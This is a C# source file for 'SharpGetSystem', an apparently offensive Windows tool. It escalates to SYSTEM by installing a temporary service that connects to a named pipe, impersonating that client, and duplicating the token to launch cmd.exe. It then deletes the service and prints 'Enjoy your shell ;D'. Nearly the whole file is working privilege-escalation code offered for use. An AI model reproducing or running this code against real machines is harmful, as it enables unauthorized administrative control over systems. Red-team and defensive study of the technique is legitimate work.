using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace SharpGetSystem.Console {
    class Program {

        public static void Start() {

            Guid g = Guid.NewGuid();

            string pipeName = @"\\.\\pipe\\4edb8323-a792-4b24-a865-1246ba3f015a"; // use dynamic one in the future
            string serviceName = g.ToString();

            // install service first
            Service.installService(serviceName, System.Reflection.Assembly.GetExecutingAssembly().Location);
            Service.manageService(serviceName, "start");

            System.Console.WriteLine("[+] Opening pipe ({0}) ", pipeName);

            IntPtr hPipe = Pinvoke.CreateNamedPipe(pipeName, 3, 0, 255, 1024, 1024, 0, IntPtr.Zero);

            if ((int)hPipe != -1) {

                System.Console.WriteLine("[+] Pipe created without errors!");
                Pinvoke.ConnectNamedPipe(hPipe, IntPtr.Zero);
                System.Console.WriteLine("[+] Connection received!");
                bool r = Pinvoke.ImpersonateNamedPipeClient(hPipe);

                // we dont need the service anymore
                Service.manageService(serviceName, "stop");
                Service.deleteService(serviceName);

                if (r) {
                    System.Console.WriteLine("[+] Success impersonating client!");
                    IntPtr hToken;

                    if (!Pinvoke.OpenThreadToken(Pinvoke.GetCurrentThread(), 0xF01FF, false, out hToken)) {
                        System.Console.WriteLine("[-] Error opening thread token ({0})!", System.Runtime.InteropServices.Marshal.GetLastWin32Error());
                    } else {
                        System.Console.WriteLine("[+] Got thread token without errors!");
                    }

                    string user = WindowsIdentity.GetCurrent().Name;
                    Pinvoke.RevertToSelf(); // revert since we already have token

                    IntPtr systemToken = IntPtr.Zero;

                    if (Pinvoke.DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out systemToken)) {
                        System.Console.WriteLine("[+] Success on duplicating token! ");
                        System.Console.WriteLine("[+] Opening cmd as {0} ", user);

                        Pinvoke.STARTUPINFO si = new Pinvoke.STARTUPINFO();
                        Pinvoke.PROCESS_INFORMATION pi = new Pinvoke.PROCESS_INFORMATION();

                        bool result = Pinvoke.CreateProcessWithTokenW(systemToken, 0x00000001, "C:\\Windows\\system32\\cmd.exe", null, 0x00000010, IntPtr.Zero, null, ref si, out pi);

                        if (result)
                            System.Console.WriteLine("[+] Enjoy your shell ;D");
                        else
                            System.Console.WriteLine("[-] Error creating process with token ({0})", System.Runtime.InteropServices.Marshal.GetLastWin32Error());


                    } else {
                        System.Console.WriteLine("[-] Error duplicating token ({0})!", System.Runtime.InteropServices.Marshal.GetLastWin32Error());
                    }

                }

            }

            System.Console.WriteLine("[-] Bye");
            System.Console.ReadKey();

        }
    }
}
